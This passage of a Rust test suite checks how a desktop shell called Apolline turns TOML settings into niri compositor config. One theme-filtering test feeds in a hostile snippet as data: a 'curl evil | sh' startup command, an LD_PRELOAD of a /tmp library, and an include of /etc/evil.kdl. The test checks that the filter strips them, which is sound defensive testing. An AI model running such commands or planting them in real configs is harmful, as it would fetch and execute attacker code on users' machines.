            "[layout]\ngradient = true\n[bar]\nblur = true\n[windows]\nanimations = 2\nmotion = \"bouncy\"\nappear = \"pop\"\nblur = \"wallpaper\"\n[[mode]]\nname = \"Play\"\nperformance = true\n",
        );
        assert_eq!(problems, vec![]);
        let calm = render(&look(&config, None));
        if let Some(dir) = std::env::var_os("APOLLINE_FRAGMENT_OUT") {
            std::fs::write(std::path::Path::new(&dir).join("candy.kdl"), &calm).unwrap();
        }
        assert_eq!(calm.matches("\nanimations {").count(), 1, "{calm}");
        assert!(calm.contains("    slowdown 0.50\n"));
        assert!(calm.contains("    workspace-switch {\n        spring damping-ratio=0.65"));
        assert!(calm.contains("custom-shader r\"\n"));
        assert!(calm.contains("active-gradient from=\"#86bdf0\""));
        assert!(calm.contains("background-effect {\n        blur true\n        xray true\n"));
        assert!(
            calm.contains("match namespace=\"^apolline-bar$\"\n    geometry-corner-radius 12\n")
        );

        let play = render(&look(&config, Some(0)));
        assert!(play.contains("animations {\n    off\n}"));
        assert!(!play.contains("background-effect"), "games get no blur");
    }

    #[test]
    fn borders_take_the_mode_accent_and_layout_follows_the_config() {
        let (config, _) = Config::parse(
            "[layout]\ngaps = 4\nradius = 0\nborders = false\n[[mode]]\nname = \"Night\"\naccent = \"#c084fc\"\nkeys = { \"Mod+N\" = \"notify-send \\\"hi\\\"\" }\n",
        );
        let text = render(&look(&config, Some(0)));
        assert!(text.contains(
            "    Mod+N hotkey-overlay-title=\"Night: notify-send \\\"hi\\\"\" { spawn-sh \"notify-send \\\"hi\\\"\"; }\n"
        ), "{text}");
        assert!(
            !render(&look(&config, None)).contains("Mod+N"),
            "mode keys leave with the mode"
        );
        let (clash, _) =
            Config::parse("[[mode]]\nname = \"X\"\nkeys = { \"Mod+Space\" = \"foot\" }\n");
        assert_eq!(
            render(&look(&clash, Some(0))).matches("Mod+Space").count(),
            1,
            "a mode key never doubles an Apolline shortcut"
        );
        assert!(text.contains("active-color \"#c084fc\""));
        assert!(text.contains("    gaps 4\n"));
        assert!(text.contains("geometry-corner-radius 0\n"));
        assert!(text.contains("border {\n        off\n"));
        let work = render(&look(&Config::default(), None));
        assert!(work.contains("active-color \"#86bdf0\""));
        assert!(work.contains("border {\n        on\n"));
        assert!(!work.contains("input {"), "input stays with niri until set");
        assert!(work.contains(
            "    Mod+Space hotkey-overlay-title=\"Search apps and games\" { spawn \"apolline\" \"launcher\"; }\n"
        ));
        assert!(work.contains(
            "    Super+Alt+L hotkey-overlay-title=\"Lock the screen\" { spawn \"apolline\" \"lock\"; }\n"
        ));
        assert!(work.contains(
            "    XF86AudioRaiseVolume allow-when-locked=true { spawn \"apolline\" \"volume\" \"up\"; }\n"
        ));
    }

    #[test]
    fn window_settings_and_app_rules_become_niri_config() {
        let (config, _) = Config::parse(
            "[windows]\nwidth = \"2/3\"\npresets = [\"1/3\", \"1/2\"]\ncenter = \"overflow\"\ncenter_lone = true\nfocus_follows_mouse = true\nopacity = 0.97\ninactive_opacity = 0.85\nanimations = 2\n\n[[rule]]\napp = \"org.pulseaudio.pavucontrol\"\nfloating = true\nwidth = \"1/3\"\n\n[[mode]]\nname = \"Play\"\nperformance = true\n",
        );
        let text = render(&look(&config, None));
        assert!(text.contains("    default-column-width {\n        proportion 0.66667\n    }\n"));
        assert!(text.contains("    preset-column-widths {\n        proportion 0.33333\n        proportion 0.50000\n    }\n"));
        assert!(text.contains(
            "    center-focused-column \"on-overflow\"\n    always-center-single-column\n"
        ));
        assert!(text.contains("    focus-follows-mouse\n"));
        assert!(text.contains("animations {\n    slowdown 0.50\n}"));
        assert!(text.contains("window-rule {\n    match is-active=false\n    opacity 0.85\n}"));
        assert!(text.contains(
            "window-rule {\n    match app-id=r#\"^org\\.pulseaudio\\.pavucontrol$\"#\n    open-floating true\n    default-column-width { proportion 0.33333; }\n}"
        ), "{text}");
        assert!(
            text.contains("recent-windows {\n    highlight {\n        active-color \"#86bdf0\"")
        );
        let play = render(&look(&config, Some(0)));
        assert_eq!(
            play.matches("\nanimations {").count(),
            1,
            "one animations block"
        );
        assert!(play.contains("animations {\n    off\n}"));
    }

    // niri refuses a whole config over one wrong bind, so what we write goes past niri itself.
    #[test]
    fn niri_accepts_what_is_written() {
        if std::process::Command::new("niri")
            .arg("--version")
            .output()
            .is_err()
        {
            return;
        }
        let configs = [
            "",
            "[shortcuts]\nlauncher = \"Mod+D\"\nlayout = \"Mod+Space\"\n\n[keyboard]\nlayouts = [\"us\", \"ru\"]\nswitch = \"caps\"\n",
            "[[display]]\nname = \"DP-1\"\nmode = \"2560x1440@164.999\"\ntransform = \"270\"\nposition = [-1080, 0]\n",
            KEYS,
        ];
        let dir = std::env::temp_dir().join(format!("apolline-niri-{}", std::process::id()));
        fs::create_dir_all(&dir).expect("a temp dir");
        for (i, source) in configs.iter().enumerate() {
            let (config, _) = Config::parse(source);
            for (mode, stay) in [(None, false), (Some(0), false), (None, true)] {
                let path = dir.join(format!("{i}.kdl"));
                let fragment = Fragment {
                    stay,
                    ..look(&config, mode)
                };
                fs::write(&path, render(&fragment)).expect("written");
                let out = std::process::Command::new("niri")
                    .args(["validate", "-c"])
                    .arg(&path)
                    .output()
                    .expect("niri runs");
                assert!(
                    out.status.success(),
                    "{source}\n{}",
                    String::from_utf8_lossy(&out.stderr)
                );
            }
        }
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn the_layout_shortcut_switches_layouts_on_any_keys() {
        let (config, _) = Config::parse("");
        let text = render(&look(&config, None));
        assert!(!text.contains("switch-layout"), "unbound by default");
        let (config, problems) =
            Config::parse("[shortcuts]\nlauncher = \"Mod+D\"\nlayout = \"Mod+Space\"\n");
        assert!(problems.is_empty(), "{problems:?}");
        let text = render(&look(&config, None));
        assert!(text.contains(
            "Mod+Space hotkey-overlay-title=\"Next keyboard layout\" { switch-layout \"next\"; }"
        ), "{text}");
        assert!(text.contains("Mod+D hotkey-overlay-title=\"Search apps and games\""));
    }

    #[test]
    fn input_settings_become_niri_blocks() {
        let (config, _) = Config::parse(
            "[keyboard]\nlayouts = [\"us\", \"ru\"]\nswitch = \"caps\"\nrepeat_rate = 40\n\n[touchpad]\ntap = false\nspeed = 0.3\n\n[mouse]\nacceleration = false\n",
        );
        let text = render(&look(&config, None));
        let input = &text[text.find("\ninput {").expect("an input block")..];
        assert!(input.starts_with(
            "\ninput {\n    keyboard {\n        xkb {\n            layout \"us,ru\"\n            options \"grp:caps_toggle\"\n        }\n        repeat-rate 40\n    }\n"
        ));
        assert!(input.contains(
            "    touchpad {\n        natural-scroll\n        dwt\n        accel-speed 0.30\n    }\n"
        ));
        assert!(input.contains(
            "    mouse {\n        accel-profile \"flat\"\n        accel-speed 0.00\n    }\n"
        ));
        assert!(!input.contains("tap\n"));
    }

    #[test]
    fn play_drops_effects_and_lets_games_drive_the_refresh_rate() {
        let outputs = ["eDP-1".to_owned(), "DP-2".to_owned()];
        let (config, _) = Config::parse("[[mode]]\nname = \"Play\"\nperformance = true\n");
        let calm = render(&Fragment {
            outputs: &outputs,
            stay: false,
            ..look(&config, None)
        });
        let play = render(&Fragment {
            outputs: &outputs,
            stay: false,
            ..look(&config, Some(0))
        });

        for text in [&calm, &play] {
            assert!(
                text.contains("output \"eDP-1\" {\n    variable-refresh-rate on-demand=true\n}")
            );
            assert!(text.contains("output \"DP-2\""));
        }
        assert!(!calm.contains("variable-refresh-rate true"));
        assert!(play.contains("variable-refresh-rate true"));
        assert!(play.contains("animations {\n    off\n}"));
        assert!(calm.contains("shadow {\n        on"));
        assert!(play.contains("shadow {\n        off"));
        for text in [&calm, &play] {
            assert_eq!(
                text.matches("\nlayout {").count(),
                1,
                "niri allows one layout per file"
            );
        }
    }

    #[test]
    fn setup_appends_the_include_once_and_keeps_a_copy() {
        let dir = scratch("setup");
        let niri = dir.join("config.kdl");
        let fragment = dir.join("apolline").join("niri.kdl");
        fs::write(&niri, "binds {\n    Mod+T { spawn \"foot\"; }\n}").unwrap();

        let mut evening = Config::default();
        evening.desktop.accent =
            apolline_config::Accent::Fixed(apolline_theme::Rgba::hex(0xf2b35c));
        setup(&fragment, &niri, &look(&Config::default(), None)).unwrap();
        let again = setup(&fragment, &niri, &look(&evening, None)).unwrap();

        let text = fs::read_to_string(&niri).unwrap();
        assert_eq!(text.matches("include").count(), 1);
        assert!(text.starts_with("binds {"));
        assert!(
            text.trim_end()
                .ends_with(&format!("include \"{}\"", fragment.display()))
        );
        assert!(
            again
                .iter()
                .any(|line| line.contains("already includes it"))
        );
        assert!(fs::read_to_string(&fragment).unwrap().contains("#f2b35c"));
        assert!(dir.join("config.kdl.before-apolline").exists());
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn a_theme_may_change_looks_and_nothing_else() {
        let snippet = r##"
// a theme's own touches
spawn-at-startup "sh" "-c" "curl evil | sh"
layout {
    gaps 20 // inner }
    focus-ring { width 3; active-color "#ff}00aa"; }
}
binds { Mod+T { spawn "evil"; } }
/* a } comment /* nested { */ still */
animations {
    window-open {
        custom-shader r"
            vec4 open_color(vec3 coords_geo, vec3 size_geo) { return vec4(1.0); }
        "
    }
}
/-window-rule { opacity 0.1; }
environment { LD_PRELOAD "/tmp/x.so"; }
window-rule { match app-id="firefox"; opacity 0.95; }
include "/etc/evil.kdl"
xwayland-satellite { path "/tmp/evil"; }
"##;
        let part = theme_part(snippet);
        for bad in [
            "spawn",
            "binds",
            "environment",
            "include",
            "xwayland",
            "opacity 0.1",
        ] {
            assert!(!part.contains(bad), "{bad} got through:\n{part}");
        }
        assert!(part.starts_with("layout {"), "{part}");
        assert!(part.contains("active-color \"#ff}00aa\"; }\n}"));
        assert!(part.contains("return vec4(1.0); }\n        \"\n    }\n}"));
        assert!(part.ends_with("window-rule { match app-id=\"firefox\"; opacity 0.95; }"));
        assert_eq!(nodes("a 1; b { c; }\nd").len(), 3);
    }

    #[test]
    fn setup_quiets_the_stock_waybar_and_nothing_else() {
        let dir = scratch("waybar");
        let niri = dir.join("config.kdl");
        let fragment = dir.join("apolline").join("niri.kdl");
        let stock = "spawn-at-startup \"waybar\"\n// spawn-at-startup \"waybar\"\nspawn-at-startup \"mako\"\nspawn-at-startup \"waybar\"; spawn-at-startup \"swaync\"\nspawn-at-startup \"waybar\" \\\n    \"-c\" \"x\"\n";
        fs::write(&niri, stock).unwrap();
        let done = setup(&fragment, &niri, &look(&Config::default(), None)).unwrap();
        let text = fs::read_to_string(&niri).unwrap();
        assert!(text.starts_with("// spawn-at-startup \"waybar\" // Apolline draws the bar\n"));
        assert!(text.contains("\n// spawn-at-startup \"waybar\"\nspawn-at-startup \"mako\"\n"));
        assert!(text.contains("\nspawn-at-startup \"waybar\"; spawn-at-startup \"swaync\"\n"));
        assert!(text.contains("\nspawn-at-startup \"waybar\" \\\n"));
        assert!(done.iter().any(|line| line.contains("line 1 ")));
        assert_eq!(
            fs::read_to_string(dir.join("config.kdl.before-apolline")).unwrap(),
            stock
        );
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn setup_starts_from_niris_own_config_when_there_is_none() {
        let dir = scratch("missing");
        let done = setup(
            &dir.join("apolline/niri.kdl"),
            &dir.join("config.kdl"),
            &look(&Config::default(), None),
        );
        if Path::new(STOCK_NIRI_CONFIG).exists() {
            let written = fs::read_to_string(dir.join("config.kdl")).unwrap();
            assert!(done.unwrap()[0].starts_with("started"));
            assert!(written.starts_with(&fs::read_to_string(STOCK_NIRI_CONFIG).unwrap()[..40]));
            assert!(written.contains("include \""));
        } else {
            assert!(done.unwrap_err().to_string().contains("start niri once"));
            assert!(!dir.join("config.kdl").exists());
        }
        fs::remove_dir_all(dir).unwrap();
    }
}
